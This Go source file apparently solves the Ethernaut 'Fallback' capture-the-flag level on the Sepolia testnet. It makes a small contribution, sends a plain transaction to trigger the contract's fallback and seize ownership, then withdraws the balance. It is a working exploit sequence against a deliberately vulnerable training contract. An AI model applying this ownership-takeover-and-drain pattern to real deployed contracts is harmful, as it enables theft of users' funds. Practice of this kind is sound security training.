package main

import (
	"context"
	"crypto/ecdsa"
	"log"
	"math/big"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/rbrick/ethernaut/contracts"
)

type FallbackPuzzle struct{}

func (*FallbackPuzzle) Execute(rpcClient *ethclient.Client, chainId *big.Int,
	privateKey *ecdsa.PrivateKey, accountAddress common.Address) error {

	addr := "0x2B38FE72cfbeebDAf9ceC39916CD0BC877796Ff1"
	contractAddr := common.HexToAddress(addr)

	fallbackContract, err := contracts.NewFallback(common.HexToAddress(addr), rpcClient)

	if err != nil {
		return err
	}

	amountToSend := 900000000000000

	transactOpts, err := Transactor(chainId)

	if err != nil {
		return err
	}

	transactOpts.Value = big.NewInt(int64(amountToSend))

	tx, err := fallbackContract.Contribute(transactOpts)

	if err != nil {
		return err
	}

	log.Println("submitted transaction:", tx.Hash().String())

	bind.WaitMined(context.Background(), rpcClient, tx)

	log.Println("completed transaction: https://sepolia.etherscan.io/tx/" + tx.Hash().String())

	accountNonce, err := rpcClient.PendingNonceAt(context.Background(), crypto.PubkeyToAddress(privateKey.PublicKey))

	log.Println(accountNonce)
	if err != nil {
		return err
	}

	gasFee, _ := rpcClient.SuggestGasPrice(context.Background())

	// log.Println("gas fee", gasFee)
	gasTip, _ := rpcClient.SuggestGasTipCap(context.Background())
	newTx := types.NewTx(&types.DynamicFeeTx{
		ChainID:   chainId,
		Value:     big.NewInt(1),
		To:        &contractAddr,
		Gas:       50000,
		Nonce:     accountNonce,
		GasFeeCap: new(big.Int).Mul(gasFee, big.NewInt(2)),
		GasTipCap: gasTip,
	})

	signedTransaction, err := types.SignTx(newTx, types.LatestSignerForChainID(chainId), privateKey)

	if err != nil {
		return err
	}

	err = rpcClient.SendTransaction(context.Background(), signedTransaction)

	if err != nil {
		log.Fatalln(err)
	}

	log.Println("submitted transaction:", signedTransaction.Hash().String())
	bind.WaitMined(context.Background(), rpcClient, signedTransaction)
	log.Println("completed transaction: https://sepolia.etherscan.io/tx/" + signedTransaction.Hash().String())

	transactOpts, err = Transactor(chainId)

	if err != nil {
		return err
	}

	tx, err = fallbackContract.Withdraw(transactOpts)

	if err != nil {
		return err
	}

	log.Println("submitted transaction:", tx.Hash().String())
	bind.WaitMined(context.Background(), rpcClient, signedTransaction)
	log.Println("completed transaction: https://sepolia.etherscan.io/tx/" + tx.Hash().String())
	return nil
}
